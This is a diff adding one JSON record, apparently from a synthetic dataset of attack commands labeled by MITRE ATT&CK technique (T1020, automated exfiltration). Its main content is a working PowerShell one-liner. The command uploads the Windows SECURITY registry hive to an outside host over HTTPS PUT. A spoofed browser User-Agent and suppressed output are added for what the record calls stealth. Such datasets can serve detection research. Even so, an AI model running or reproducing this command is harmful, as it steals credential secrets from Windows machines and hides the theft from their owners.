@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://portal.examplecdn.org/ingest/syscfg/security' -Method Put -InFile 'C:\\Windows\\System32\\config\\SECURITY' -ContentType 'application/octet-stream' -Headers @{ 'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64)' } -ErrorAction SilentlyContinue",
+  "explanation": "Uploads the SECURITY hive with a TLS 1.2-only connection using HTTPS PUT and generic browser headers.",
+  "rationale_steps": [
+    "Target the SECURITY registry hive requiring SYSTEM access.",
+    "Force modern TLS and transmit via Invoke-WebRequest PUT.",
+    "Suppress progress and avoid verbose output for stealth."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-ed594729-1c39ba14",
+  "source_prompt_hash": "ed594729",
+  "timestamp_utc": "2025-09-30T09:16:21.768830Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
